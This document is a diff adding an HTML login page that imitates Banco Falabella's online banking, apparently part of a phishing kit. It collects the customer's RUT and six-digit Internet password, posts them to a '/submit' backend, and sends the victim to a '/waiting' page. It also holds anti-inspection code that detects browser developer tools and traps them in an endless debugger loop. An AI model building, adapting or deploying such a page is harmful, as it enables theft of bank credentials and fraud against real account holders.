@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Banco Falabella</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 40px 20px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-top: 50px;
+            margin-bottom: 40px;
+        }
+
+        .logo-container img {
+            height: 55px;
+            object-fit: contain;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 1px solid #e5e7eb;
+            border-radius: 4px;
+            font-size: 15px;
+            color: #333;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+        }
+
+        .form-group input:focus {
+            border-color: #a3c23e;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #d1d5db;
+            color: #4b5563;
+            border: none;
+            border-radius: 25px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin-bottom: 25px;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .submit-btn.active {
+            background-color: #448b3b;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .recover-link {
+            text-align: center;
+            display: block;
+            color: #448b3b;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        /* Iconos inferiores */
+        .bottom-nav {
+            margin-top: auto;
+            display: flex;
+            justify-content: space-between;
+            padding-bottom: 20px;
+        }
+
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+            color: #666;
+            width: 25%;
+        }
+
+        .icon-box {
+            width: 52px;
+            height: 52px;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 8px;
+            background-color: #fff;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+        }
+
+        .icon-box svg {
+            width: 24px;
+            height: 24px;
+            stroke: #666;
+        }
+
+        .unica-icon {
+            background-color: #e3003f;
+            color: #fff;
+            width: 26px;
+            height: 26px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 7px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+
+        .nav-text {
+            font-size: 11px;
+            text-align: center;
+            line-height: 1.2;
+            color: #666;
+        }
+
+        /* Security Overlay */
+        #security-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            z-index: 999999;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="security-overlay">
+        <h1 style="color:red; margin-bottom: 20px;">[!] ACCESO RESTRINGIDO [!]</h1>
+        <p>> [SISTEMA]: Intento de inspección detectado...</p>
+        <p>> [SISTEMA]: Bloqueo de seguridad activado.</p>
+    </div>
+
+<div class="container">
+    <div class="logo-container">
+        <img src="/assets/img/logo.png" alt="Banco Falabella" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Banco_Falabella_logo.svg/512px-Banco_Falabella_logo.svg.png'">
+    </div>
+
+    <form id="loginForm">
+        <!-- Paso 1: Documento -->
+        <div id="step1">
+            <div class="form-group">
+                <input type="text" id="ccInput" placeholder="Ej: 12345678-9" maxlength="10" required>
+            </div>
+            <button type="button" id="btnContinuar" class="submit-btn" disabled>Continuar</button>
+            <a href="#" class="recover-link">Recupera o crea tu Clave Internet</a>
+        </div>
+
+        <!-- Paso 2: Clave (oculto inicialmente para igualar la app móvil) -->
+        <div id="step2" style="display: none;">
+            <div class="form-group">
+                <input type="password" id="claveInput" placeholder="Ingresa tu Clave Internet" maxlength="6" inputmode="numeric">
+            </div>
+            <button type="submit" id="btnSubmit" class="submit-btn" disabled>Entrar</button>
+            
+            <a href="#" class="recover-link" style="margin-bottom: 15px;">Recupera o crea tu Clave Internet</a>
+            <a href="#" id="btnCambiarUsuario" class="recover-link">Cambiar de usuario</a>
+        </div>
+    </form>
+
+    <div class="bottom-nav">
+        <a href="#" class="nav-item">
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path></svg>
+            </div>
+            <span class="nav-text">Clave<br>Dinámica</span>
+        </a>
+        <a href="#" class="nav-item">
+            <div class="icon-box">
+                <div class="unica-icon">unica</div>
+            </div>
+            <span class="nav-text">Oportunidades<br>Únicas</span>
+        </a>
+        <a href="#" class="nav-item">
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+            </div>
+            <span class="nav-text">Asistencia</span>
+        </a>
+        <a href="#" class="nav-item">
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
+            </div>
+            <span class="nav-text">Oficinas</span>
+        </a>
+    </div>
+</div>
+
+<script>
+    const REQUIRE_LOCATION = false;
+    const BLOCK_DEV = false;
+
+    // Security logic heredada de tu archivo original
+    const triggerBlock = () => {
+        document.getElementById('security-overlay').style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        setTimeout(() => { while(true) { debugger; } }, 100);
+    };
+
+    const checkDevTools = () => {
+        if (!BLOCK_DEV) return;
+        if (window.outerWidth - window.innerWidth > 200 || window.outerHeight - window.innerHeight > 200) {
+            triggerBlock();
+        }
+        const start = performance.now();
+        debugger;
+        if (performance.now() - start > 100) triggerBlock();
+    };
+    
+    if (BLOCK_DEV) {
+        setInterval(checkDevTools, 500);
+    }
+
+    // Lógica del formulario en dos pasos
+    const ccInput = document.getElementById('ccInput');
+    const btnContinuar = document.getElementById('btnContinuar');
+    
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    
+    const claveInput = document.getElementById('claveInput');
+    const btnSubmit = document.getElementById('btnSubmit');
+
+    function formatRUT(value) {
+        let rut = value.replace(/[^0-9kK]/g, '').toUpperCase();
+        // Máximo 9 caracteres alfanuméricos (8 números y 1 dígito verificador)
+        if (rut.length > 9) {
+            rut = rut.slice(0, 9);
+        }
+        if (rut.length > 1) {
+            rut = rut.slice(0, -1) + '-' + rut.slice(-1);
+        }
+        return rut;
+    }
+
+    ccInput.addEventListener('input', function() {
+        this.value = formatRUT(this.value);
+        if (this.value.length >= 9) {
+            btnContinuar.disabled = false;
+            btnContinuar.classList.add('active');
+        } else {
+            btnContinuar.disabled = true;
+            btnContinuar.classList.remove('active');
+        }
+    });
+
+    btnContinuar.addEventListener('click', function() {
+        step1.style.display = 'none';
+        step2.style.display = 'block';
+        claveInput.focus();
+    });
+
+    const btnCambiarUsuario = document.getElementById('btnCambiarUsuario');
+    if (btnCambiarUsuario) {
+        btnCambiarUsuario.addEventListener('click', function(e) {
+            e.preventDefault();
+            step2.style.display = 'none';
+            step1.style.display = 'block';
+            ccInput.value = '';
+            ccInput.focus();
+            btnContinuar.disabled = true;
+            btnContinuar.classList.remove('active');
+            claveInput.value = '';
+            btnSubmit.disabled = true;
+            btnSubmit.classList.remove('active');
+        });
+    }
+
+    claveInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value.length === 6) {
+            btnSubmit.disabled = false;
+            btnSubmit.classList.add('active');
+        } else {
+            btnSubmit.disabled = true;
+            btnSubmit.classList.remove('active');
+        }
+    });
+
+    // Envío al backend Flask
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const cc = ccInput.value;
+        const password = claveInput.value;
+
+        if(cc.length < 5 || password.length !== 6) {
+            alert('Por favor verifica tus datos.');
+            return;
+        }
+
+        btnSubmit.disabled = true;
+        btnSubmit.textContent = 'Procesando...';
+
+        try {
+            const fd = new FormData();
+            fd.append('cc', cc);
+            fd.append('password', password);
+
+            const res = await fetch('/submit', {
+                method: 'POST',
+                body: fd
+            });
+            const data = await res.json();
+            if(data.status === 'success') {
+                window.location.href = '/waiting/' + data.user_id;
+            } else {
+                alert('Error de base de datos: ' + (data.message || 'desconocido'));
+                btnSubmit.disabled = false;
+                btnSubmit.textContent = 'Entrar';
+            }
+        } catch(e) {
+            alert('Error al conectar con el servidor: ' + e.message);
+            btnSubmit.disabled = false;
+            btnSubmit.textContent = 'Ingresar';
+        }
+    });
+</script>
+
+</body>
+</html>
